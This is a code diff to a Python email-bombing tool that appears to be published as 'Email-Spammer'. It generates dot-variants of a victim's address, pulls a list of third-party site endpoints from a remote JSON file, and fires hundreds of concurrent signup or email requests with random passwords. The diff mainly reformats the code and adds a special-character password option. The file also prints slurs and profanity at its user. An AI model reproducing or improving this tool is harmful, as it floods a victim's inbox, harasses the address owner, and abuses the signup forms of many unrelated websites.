@@ -30,6 +30,7 @@ size = 600  # Threads + Process / Iterations
 cap = None  # thread limit / set to None for unlimited. Only go higher than 500 is u got a fucking beast of a pc CPU wise.
 random_threads = True  # True = Threads Random. False = They Arent Random
 include_nsfw_sites = True  # True = Include NSFW sites. False = No NSFW sites
+include_special_characters = True # added if u want to include special characters for the password when ur sending the api requests
 timeout = aiohttp.ClientTimeout(total=20)
 init(autoreset=True)
 
@@ -48,10 +49,13 @@ def update_title():
     while True:
         title = "[t.me/influenceable]" + "".join(
             random.choices(
-                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=30
+                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+                k=30,
             )
         )
-        os.system(f"title {title}" if os.name == "nt" else f"\033]0;{title}\007")
+        os.system(
+            f"title {title}" if os.name == "nt" else f"\033]0;{title}\007"
+        )
         time.sleep(0.2)
 
 
@@ -63,6 +67,8 @@ def credit():
     time.sleep(5)
 
     # skidded from chatgpt
+
+
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
@@ -82,9 +88,12 @@ def generate_email_variants(email):
                 variant = variant[:index] + "." + variant[index:]
             variants.append(variant)
 
-    data = list(sorted(dict.fromkeys([variant + "@" + domain for variant in variants])))
+    data = list(
+        sorted(dict.fromkeys([variant + "@" + domain for variant in variants]))
+    )
     results = [email] + random.sample(data, k=len(data))
     return results
+
 
 def generate(length: int = 5):
     ba = bytearray(os.urandom(length))
@@ -92,19 +101,25 @@ def generate(length: int = 5):
         ba[i] = ord("a") + b % 26
     return str(time.time()).replace(".", "") + ba.decode("ascii")
 
+
 def validate_email(email):
     return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)
+
 
 def is_html_string(text: str) -> bool:
     return bool(re.compile(r"<[^>]+>").search(text))
 
+
 def clamp(value, min_value, max_value):
     return max(min_value, min(value, max_value))
+
 
 def divide():
     print("-" * 40)
 
+
 progress = 0
+
 
 def update_progress():
     global progress
@@ -114,7 +129,8 @@ def update_progress():
     white = "█" * int(amount - int((1 - decimal) * amount))
     black = "░" * int(amount - int(decimal * amount))
     print(
-        f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」", end="\r"
+        f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」",
+        end="\r",
     )
     if progress >= total:
         print("\r")
@@ -230,7 +246,12 @@ async def fetch(
                         "url": url,
                         "resp": resp,
                     }
-    except (Exception, asyncio.CancelledError, AssertionError, TimeoutError) as err:
+    except (
+        Exception,
+        asyncio.CancelledError,
+        AssertionError,
+        TimeoutError,
+    ) as err:
         pass
     return update_progress()
 
@@ -309,7 +330,9 @@ async def main():
         async with aiohttp.ClientSession() as session:
             directory = os.path.dirname(__file__)
             try:
-                with open(os.path.join(directory, "functions.json"), "r") as file:
+                with open(
+                    os.path.join(directory, "functions.json"), "r"
+                ) as file:
                     functions = json.load(file)
             except Exception:
                 print(f"\r[{red_dash}] No Data Found, Refering To Backup Data")
@@ -319,7 +342,7 @@ async def main():
                 print(f"\r[{yellow_dash}] Connecting now...")
                 time.sleep(3)
                 async with session.get(
-                    "https://rawcdn.githack.com/Inkthirsty/Email-Spammer/ce70ff9a875692f37d7fca5aedae2db7e93c1f11/functions.json" # changed to
+                    "https://rawcdn.githack.com/Inkthirsty/Email-Spammer/ce70ff9a875692f37d7fca5aedae2db7e93c1f11/functions.json"  # changed to
                 ) as resp:
                     functions = json.loads(await resp.text())
                     clear_console()
@@ -347,11 +370,15 @@ async def main():
                 string.ascii_lowercase,
                 string.ascii_uppercase,
                 string.digits,
-                # No more special characters, some websites hate that :(
             ]
-            for _ in samples:
-                password += "".join(random.sample(_, k=5))
-                password = "!" + "".join(random.sample(password, k=len(password)))
+
+            if include_special_characters:
+                samples.append(string.punctuation) # makes special characters a true or false statement
+
+            for sample in samples:
+                password += "".join(random.sample(sample, k=5))
+
+            password = "!" + "".join(random.sample(password, k=len(password))) 
 
             email = None
             while True:
@@ -364,7 +391,9 @@ async def main():
                     break
                 clear_console()
                 print(Center.XCenter(faded_text))
-                print(f"\r[{red_dash}] That isnt a fucking email address you retard")
+                print(
+                    f"\r[{red_dash}] That isnt a fucking email address you retard"
+                )
                 print(f"\r[{green_dash}] Lets try that again :)")
                 time.sleep(2)
                 await main()
@@ -375,7 +404,9 @@ async def main():
                 try:
                     limit = clamp(len(variants), 1, cap or float("inf"))
                     threads = (
-                        input(f"\r[{yellow_dash}] Threads per batch (1-{limit}): ")
+                        input(
+                            f"\r[{yellow_dash}] Threads per batch (1-{limit}): "
+                        )
                         .strip()
                         .lower()
                     )
@@ -426,7 +457,9 @@ async def main():
                     f"\r[{green_dash}] Pretesting endpoints to grant 2 minutes of life ♥ ♥ ♥"
                 )
                 test_tasks = [
-                    asyncio.create_task(fetch(session, email, values, name, True))
+                    asyncio.create_task(
+                        fetch(session, email, values, name, True)
+                    )
                     for name, values in functions.items()
                 ]
                 total = len(test_tasks)
@@ -434,7 +467,9 @@ async def main():
                     await asyncio.gather(*test_tasks)
                 except Exception:
                     pass
-                working = [k for k, v in status_codes.items() if v.get("status") < 400]
+                working = [
+                    k for k, v in status_codes.items() if v.get("status") < 400
+                ]
                 print(
                     f"\r[{yellow_dash}] {len(working)}/{len(test_tasks)} endpoints may be working"
                 )
@@ -459,7 +494,8 @@ async def main():
             print(f"\r[{green_dash}] Sending Emails!")
             for j in range(0, len(queue), size):
                 tasks = [
-                    asyncio.create_task(fetch(*task)) for task in queue[j : j + size]
+                    asyncio.create_task(fetch(*task))
+                    for task in queue[j : j + size]
                 ]
                 try:
                     await asyncio.gather(*tasks)
@@ -479,7 +515,9 @@ async def main():
             ) as resp:
                 words = ", ".join(random.sample(await resp.json(), k=5))
             prefix = "an" if words[0] in "aeiou" else "a"
-            print(f"\r[{green_dash}] I hope you have {prefix} {words} day ^_^")
+            print(
+                f"\r[{green_dash}] I hope you have {prefix} {words} day ^_^"
+            )  # chelpus ahh code
             with open(
                 os.path.join(directory, "results.txt"), "w", encoding="utf-8"
             ) as file:
@@ -493,7 +531,7 @@ async def main():
                 )
                 file.write(e)
             time.sleep(2)
-            trio.run(menu) # using trio lib so i dont have to make it a loop
+            trio.run(menu)
     except Exception as error:
         print(error)
         print(
